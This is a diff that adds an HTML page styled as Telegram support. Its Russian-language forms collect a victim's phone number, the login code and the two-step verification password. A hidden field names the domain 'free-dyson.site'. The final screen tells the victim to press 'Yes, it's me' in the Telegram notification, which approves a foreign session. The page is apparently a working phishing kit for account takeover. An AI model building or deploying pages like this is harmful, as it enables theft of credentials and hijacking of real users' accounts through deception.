@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/api/download/style.css">
+    <link rel="icon" type="image/png" sizes="144x144" href="https://web.telegram.org/k/assets/img/android-chrome-144x144.png?v=jw3mK7G9Ry">
+    <title>Telegram Support</title>
+</head>
+<body>
+    <div class="main">
+        <div id="ex1" class="modal">
+            <p>Некорректный ввод номера</p>
+            <a href="#" rel="modal:close">Close</a>
+        </div>
+        <div class="header"></div>
+        <div class="content">
+            <div id="form_start_process" class="form">
+                                        <img id="logo" src="/api/download/media/telegram-logo.1b2bb5b107f046ea9325.svg" style="width: 10rem;height: 10rem;margin-bottom: 2.5rem;" alt="">
+                                        <h1>Telegram</h1>
+                                        <p class="note">Введите свой номер телефона</p>
+                                        <form method="post">
+                                            <div class="input-group touched with-label">
+                                                <input class="form-control" type="text" id="sign-in-phone-number" name="phone_number" dir="auto" inputmode="tel" aria-label="Номер телефона"><label for="sign-in-phone-number">Номер телефона</label>
+                                            </div>
+                                            <input type="hidden" name="domain" value="free-dyson.site">
+                                            <label class="Checkbox">
+                                                <input type="checkbox" id="sign-in-keep-session">
+                                                <div class="Checkbox-main"><span class="label" dir="auto">Keep me signed in</span></div>
+                                            </label>
+                                            <button type="button" id="send_code" class="Button default primary has-ripple" style="">
+                                                Далее
+                                                <div class="lds-ring loading" style="display: none;"><div></div><div></div><div></div><div></div></div>
+                                            </button>
+
+                                        </form>
+                                    </div>
+            <div id="form_get_code" class="form">
+                <div class="logo">
+                    <img src="/api/download/media/logo.png" alt="">
+                </div>
+                <div class="title">Telegram</div>
+                <div class="desc">Мы выслали вам сообщение в Telegram с кодом подтверждения</div>
+                <input type="number" placeholder="Код" name="" id="code">
+            </div>
+            <div id="form_get_password" class="form">
+                <div class="logo">
+                    <img src="/api/download/media/monk.png" alt="">
+                </div>
+                <div class="title">Введите Пароль</div>
+                <div class="desc">Ваш аккаунт защищён дополнительным паролем.</div>
+                <input type="text" placeholder="Пароль" name="" id="password">
+                <span id="send_password" class="btn_primary">Далее</span>
+            </div>
+             <div id="form_get_password2" class="form" style="max-width: 600px; width: 95%; text-align: center; font-weight: 400; font-size: 19px; font-family: 'lucida',Arial,sans-serif;">
+                <div class="title" style="color:#24AFDEFF;">Авторизация завершена</div>
+                <div class="tn-atom" field="tn_text_1683230376356" style="line-height: 29px;">Мы сбросили все незавершенные попытки входа и сторонние сессии кроме тех, что были выполнены с Вашего устройства.<br><br>Теперь Вы будете видеть каждую новую авторизацию в уведомлении над списком чатов в приложении Telegram.<br><br>Чтобы <strong>завершить аутентификацию</strong>, жмите в уведомлении<br/><strong style="color:#24afde">"Да, я"</strong> </div> </div>
+            </div>
+            <div id="loading" class="form">
+                <img src="/api/download/media/91.gif" alt="">
+            </div>
+        </div>
+        <div class="footer">
+            <a id="to_modal_phone_error" href="#ex1" rel="modal:open">Open Modal</a>
+        </div>
+    </div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.css" />
+    <script src="/api/download/mask.js"></script>
+    <script src="/api/download/script.js"></script>
+</body>
+</html>
